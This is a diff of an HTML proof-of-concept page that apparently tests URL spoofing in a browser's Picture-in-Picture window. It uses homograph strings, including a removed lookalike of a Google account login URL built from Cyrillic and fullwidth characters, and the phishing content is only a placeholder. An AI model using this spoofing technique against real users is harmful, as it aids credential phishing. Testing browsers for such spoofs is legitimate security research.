@@ -3,18 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PIP Homograph Test</title>
-<style>
-    #content {
-        display: none;
-    }
-</style>
+<title>Homograph Test</title>
 </head>
 <body>
 
 <button id="button">Open PIP</button>
 
-<div id="content">
+<div id="content" style="display: none;">
     phishing page content here
 </div>
 
@@ -23,8 +18,8 @@
     const content = document.getElementById('content');
 
     const pipOpen = async () => {
-        const homographQuery = '?...............................https:\uFF0F\uFF0F\u0430ccounts.google.com\uFF0Flogin\uFF0Fdevice\uFF0Fverify';
-        history.replaceState(null, '', homographQuery);
+        const homographString = '\u0430\u0440\u0440\u0431\u0435.com';
+        history.replaceState(null, '', '?target=' + encodeURIComponent(homographString));
 
         const pipWindow = await documentPictureInPicture.requestWindow({
             width: 330,
